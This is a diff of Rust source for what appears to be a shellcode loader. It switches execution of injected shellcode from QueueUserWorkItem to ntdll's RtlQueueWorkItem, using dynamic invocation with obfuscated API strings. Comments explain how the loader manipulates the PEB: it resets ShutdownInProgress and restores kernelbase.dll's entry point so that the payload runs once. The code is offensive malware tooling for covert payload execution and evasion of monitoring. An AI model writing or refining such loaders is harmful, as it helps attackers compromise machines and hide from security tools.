@@ -131,13 +131,12 @@ fn run() -> bool
 
         quit_shutdown();
 
-        let f: data::QueueUserWorkItem;
+        let f: data::RtlQueueWorkItem;
         let _r: Option<bool>;
         let dir: *mut c_void = *base_address_shellcode; 
         let context: *mut c_void = std::mem::transmute(0isize);
-        let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
         // Run the injected shellcode on the default thread pool
-        dinvoke::dynamic_invoke!(k32,&lc!("QueueUserWorkItem"),f,_r,dir,context,0x00000000 as u32);
+        dinvoke::dynamic_invoke!(ntdll,&lc!("RtlQueueWorkItem"),f,_r,dir,context,0x00000000 as u32);
         
         let ki_user_inverted_function_table = dinvoke::get_function_address(ntdll, &lc!("KiUserInvertedFunctionTable"));
         let s = isize::default();
@@ -185,10 +184,11 @@ fn run() -> bool
 
     }
 }
+
 /*
     Since we want our payload to be executed only once, we need to restore the PEB to its previous state.
     To do so, we iterate again over the PEB's loaded modules list until we find the entry corresponding to
-    kernelbase.dll and we restore the entry point value.
+    kernelbase.dll and we restore the entry point address.
  */
 fn restore_peb()
 {
@@ -277,7 +277,7 @@ fn restore_peb()
                 let rva = *offset as isize;
                 // Kernelbase.dll's entry point offset calculation
                 let entry_point_offset = (kernelbase + rva + 0x18 + 16 as isize) as *const u32;
-                entry.Reserved3[0] = (kernelbase + *entry_point_offset as isize) as *mut _;//addr as *mut _;//(bbb + off) as *mut _;//(test as *const()) as *mut _;//// 
+                entry.Reserved3[0] = (kernelbase + *entry_point_offset as isize) as *mut _; 
                 let written = usize::default();
                 let bytes_written: *mut usize = std::mem::transmute(&written);
 
@@ -308,7 +308,7 @@ fn restore_peb()
 
 /*
     Just in case this loader is triggered when the process is being terminated, we need to 
-    set the PEB's ShutdownInProgress value to false before calling QueueUserWorkItem.
+    set the PEB's ShutdownInProgress value to false before calling RtlQueueWorkItem.
  */
 fn quit_shutdown()
 {
